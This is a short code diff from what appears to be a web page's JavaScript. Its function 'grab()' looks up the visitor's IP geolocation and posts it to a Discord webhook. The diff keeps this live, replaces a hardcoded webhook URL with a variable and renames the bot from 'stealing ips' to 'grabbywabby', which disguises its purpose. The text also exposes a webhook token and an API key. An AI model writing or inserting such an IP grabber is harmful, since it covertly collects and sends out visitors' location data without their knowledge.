@@ -132,19 +132,15 @@ document.getElementById("input").addEventListener("keydown", function (e) {
 });
 
 function grab() {
-  console.log("cock");
   var req = new XMLHttpRequest();
-  req.open(
-    "POST",
-    "https://discord.com/api/webhooks/953364959495069836/cFJBDYv6G2mEO74lD_aiVSMDqyljn0YvqQebKvf6oG72c5nsyFCzjACXtA1KgdsH-d4w"
-  );
+  req.open("POST", webhook);
   req.setRequestHeader("Content-type", "application/json");
 
   $.getJSON(
     "https://ipgeolocation.abstractapi.com/v1/?api_key=159b017772384f868853bf1904ea59d4",
     function (data) {
       var params = {
-        username: "stealing ips",
+        username: "grabbywabby",
         content: data,
       };
       req.send(JSON.stringify(params));
